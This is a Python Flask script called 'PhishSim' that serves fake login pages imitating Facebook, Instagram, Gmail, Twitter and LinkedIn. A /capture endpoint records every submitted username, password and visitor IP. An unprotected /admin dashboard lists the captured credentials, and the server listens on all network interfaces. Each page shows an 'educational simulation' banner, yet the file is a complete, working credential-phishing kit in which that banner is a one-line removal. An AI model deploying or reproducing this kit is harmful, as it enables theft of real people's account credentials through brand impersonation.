#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO
import os
import json
import datetime

app = Flask(__name__, static_folder='static')
app.config['SECRET_KEY'] = 'test'
socketio = SocketIO(app, cors_allowed_origins="*")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(BASE_DIR, 'logs')
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')

os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(TEMPLATES_DIR, exist_ok=True)

# Create template folders
for t in ['facebook', 'instagram', 'gmail', 'twitter', 'linkedin', 'custom']:
    os.makedirs(os.path.join(TEMPLATES_DIR, t), exist_ok=True)

def log_file():
    return os.path.join(LOGS_DIR, 'creds.json')

def visits_file():
    return os.path.join(LOGS_DIR, 'visits.json')

def load_json(f):
    if os.path.exists(f):
        with open(f, 'r', encoding='utf-8') as file:
            return json.load(file)
    return []

def save_json(f, d):
    with open(f, 'w', encoding='utf-8') as file:
        json.dump(d, file, indent=2)

def get_template_html(template_name):
    """Get template HTML or generate default"""
    template_path = os.path.join(TEMPLATES_DIR, template_name, 'index.html')
    
    if os.path.exists(template_path):
        with open(template_path, 'r', encoding='utf-8') as f:
            return f.read()
    
    # Return default template based on name
    templates = {
        'facebook': '''
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Educational</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; }
        h1 { color: #1877f2; font-size: 48px; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        button:hover { background: #166fe5; }
        .warn { position: fixed; bottom: 10px; right: 10px; background: red; color: white; padding: 10px; font-size: 14px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="warn">⚠️ EDUCATIONAL SIMULATION ONLY</div>
    <div class="container">
        <div class="box">
            <h1>facebook</h1>
            <form id="loginForm">
                <input type="text" id="email" placeholder="Email or phone number" required>
                <input type="password" id="pass" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    template: 'facebook',
                    username: document.getElementById('email').value,
                    password: document.getElementById('pass').value
                })
            }).then(() => {
                alert('⚠️ EDUCATIONAL DEMO: Credentials captured for demonstration only!');
                document.getElementById('loginForm').reset();
            });
        });
    </script>
</body>
</html>''',
        
        'instagram': '''
<!DOCTYPE html>
<html>
<head>
    <title>Instagram - Educational</title>
    <style>
        body { font-family: Arial; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        h1 { font-family: 'Brush Script MT', cursive; font-size: 50px; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 3px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0081d6; }
        .warn { position: fixed; bottom: 10px; right: 10px; background: red; color: white; padding: 10px; font-size: 14px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="warn">⚠️ EDUCATIONAL SIMULATION ONLY</div>
    <div class="box">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" id="user" placeholder="Username" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    template: 'instagram',
                    username: document.getElementById('user').value,
                    password: document.getElementById('pass').value
                })
            }).then(() => {
                alert('⚠️ EDUCATIONAL DEMO: Credentials captured!');
                document.getElementById('loginForm').reset();
            });
        });
    </script>
</body>
</html>''',
        
        'gmail': '''
<!DOCTYPE html>
<html>
<head>
    <title>Gmail - Educational</title>
    <style>
        body { font-family: 'Roboto', Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 400px; padding: 40px; }
        h1 { color: #4285f4; font-size: 24px; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background: #1557b0; }
        .warn { position: fixed; bottom: 10px; right: 10px; background: red; color: white; padding: 10px; font-size: 14px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="warn">⚠️ EDUCATIONAL SIMULATION ONLY</div>
    <div class="box">
        <h1>Sign in</h1>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    template: 'gmail',
                    username: document.getElementById('email').value,
                    password: document.getElementById('pass').value
                })
            }).then(() => {
                alert('⚠️ EDUCATIONAL DEMO: Credentials captured!');
                document.getElementById('loginForm').reset();
            });
        });
    </script>
</body>
</html>''',
        
        'twitter': '''
<!DOCTYPE html>
<html>
<head>
    <title>Twitter - Educational</title>
    <style>
        body { font-family: Arial; background: #15202b; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #192734; padding: 40px; border-radius: 15px; width: 400px; }
        h1 { color: #1da1f2; font-size: 36px; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #38444d; border-radius: 5px; background: #253341; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #1da1f2; color: white; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; }
        button:hover { background: #1991da; }
        .warn { position: fixed; bottom: 10px; right: 10px; background: red; color: white; padding: 10px; font-size: 14px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="warn">⚠️ EDUCATIONAL SIMULATION ONLY</div>
    <div class="box">
        <h1>Twitter</h1>
        <form id="loginForm">
            <input type="text" id="user" placeholder="Username or Email" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    template: 'twitter',
                    username: document.getElementById('user').value,
                    password: document.getElementById('pass').value
                })
            }).then(() => {
                alert('⚠️ EDUCATIONAL DEMO: Credentials captured!');
                document.getElementById('loginForm').reset();
            });
        });
    </script>
</body>
</html>''',
        
        'linkedin': '''
<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn - Educational</title>
    <style>
        body { font-family: Arial; background: #f3f2ef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 400px; }
        h1 { color: #0a66c2; font-size: 32px; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #000; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #0a66c2; color: white; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; }
        button:hover { background: #004182; }
        .warn { position: fixed; bottom: 10px; right: 10px; background: red; color: white; padding: 10px; font-size: 14px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="warn">⚠️ EDUCATIONAL SIMULATION ONLY</div>
    <div class="box">
        <h1>LinkedIn</h1>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    template: 'linkedin',
                    username: document.getElementById('email').value,
                    password: document.getElementById('pass').value
                })
            }).then(() => {
                alert('⚠️ EDUCATIONAL DEMO: Credentials captured!');
                document.getElementById('loginForm').reset();
            });
        });
    </script>
</body>
</html>'''
    }
    
    return templates.get(template_name, templates['facebook'])

@app.route('/')
def index():
    template = request.args.get('template', 'facebook')
    custom = request.args.get('custom', 'false').lower() == 'true'
    
    # Log visit
    visits = load_json(visits_file())
    visits.append({
        'time': str(datetime.datetime.now()),
        'ip': request.remote_addr,
        'template': template
    })
    save_json(visits_file(), visits)
    
    # Get template HTML
    if custom:
        template_path = os.path.join(TEMPLATES_DIR, 'custom', template, 'index.html')
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                return f.read()
    
    return get_template_html(template)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if data:
        creds = load_json(log_file())
        creds.append({
            'time': str(datetime.datetime.now()),
            'ip': request.remote_addr,
            'username': data.get('username', ''),
            'password': data.get('password', ''),
            'template': data.get('template', 'unknown')
        })
        save_json(log_file(), creds)
        print(f'[+] Captured: {data.get("username")} / {data.get("password")} ({data.get("template")})')
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error'}), 400

@app.route('/admin')
def admin():
    creds = load_json(log_file())
    visits = load_json(visits_file())
    
    # Count by template
    template_counts = {}
    for v in visits:
        t = v.get('template', 'unknown')
        template_counts[t] = template_counts.get(t, 0) + 1
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhishSim Admin</title>
        <style>
            body {{ font-family: 'Segoe UI', Arial; background: #0f0f1a; color: #e0e0e0; padding: 20px; margin: 0; }}
            h1 {{ color: #00d9ff; margin-bottom: 10px; }}
            .subtitle {{ color: #888; margin-bottom: 20px; }}
            .stats {{ display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }}
            .stat-box {{ background: #1a1a2e; padding: 20px; border-radius: 10px; min-width: 150px; text-align: center; border-left: 4px solid #00d9ff; }}
            .stat-number {{ font-size: 36px; font-weight: bold; color: #00d9ff; }}
            .stat-label {{ color: #888; font-size: 14px; margin-top: 5px; }}
            .templates {{ display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }}
            .template-btn {{ background: #252538; color: #fff; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block; }}
            .template-btn:hover {{ background: #00d9ff; color: #000; }}
            table {{ width: 100%; border-collapse: collapse; background: #1a1a2e; border-radius: 10px; overflow: hidden; margin-top: 20px; }}
            th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid #333; }}
            th {{ background: #252538; color: #00d9ff; font-weight: 600; }}
            tr:hover {{ background: #252538; }}
            .ip {{ font-family: monospace; color: #f39c12; }}
            .pass {{ font-family: monospace; background: #e74c3c; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }}
            .user {{ font-weight: bold; color: #2ecc71; }}
            .time {{ color: #888; font-size: 12px; }}
            .template-tag {{ background: #9b59b6; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }}
            .refresh {{ background: #00d9ff; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }}
            .refresh:hover {{ background: #00b8d4; }}
            h2 {{ color: #00d9ff; margin-top: 30px; margin-bottom: 15px; }}
        </style>
    </head>
    <body>
        <h1>🎯 PhishSim Admin Panel</h1>
        <p class="subtitle">Educational Phishing Simulation Dashboard</p>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{len(visits)}</div>
                <div class="stat-label">Total Visits</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{len(creds)}</div>
                <div class="stat-label">Credentials</div>
            </div>
        </div>
        
        <h2>🔗 Quick Links (Click to Test Templates)</h2>
        <div class="templates">
            <a href="http://localhost:5000/?template=facebook" target="_blank" class="template-btn">📘 Facebook</a>
            <a href="http://localhost:5000/?template=instagram" target="_blank" class="template-btn">📷 Instagram</a>
            <a href="http://localhost:5000/?template=gmail" target="_blank" class="template-btn">📧 Gmail</a>
            <a href="http://localhost:5000/?template=twitter" target="_blank" class="template-btn">🐦 Twitter</a>
            <a href="http://localhost:5000/?template=linkedin" target="_blank" class="template-btn">💼 LinkedIn</a>
        </div>
        
        <button class="refresh" onclick="location.reload()">🔄 Refresh Data</button>
        
        <h2>🔐 Captured Credentials</h2>
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Time</th>
                    <th>IP Address</th>
                    <th>Template</th>
                    <th>Username</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody>
    '''
    
    for i, c in enumerate(reversed(creds)):
        html += f'''
                <tr>
                    <td>{i + 1}</td>
                    <td class="time">{c.get('time', '-')}</td>
                    <td class="ip">{c.get('ip', '-')}</td>
                    <td><span class="template-tag">{c.get('template', '-')}</span></td>
                    <td class="user">{c.get('username', '-')}</td>
                    <td><span class="pass">{c.get('password', '-')}</span></td>
                </tr>
        '''
    
    if not creds:
        html += '''
                <tr>
                    <td colspan="6" style="text-align: center; padding: 40px; color: #666;">
                        No credentials captured yet. Click a template above to test!
                    </td>
                </tr>
        '''
    
    html += '''
            </tbody>
        </table>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    print('[+] =======================================')
    print('[+] PhishSim Multi-Template Tool Started')
    print('[+] =======================================')
    print('[+] Templates: facebook, instagram, gmail, twitter, linkedin')
    print('[+] URL: http://localhost:5000/?template=NAME')
    print('[+] Admin: http://localhost:5000/admin')
    print('[+] =======================================')
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)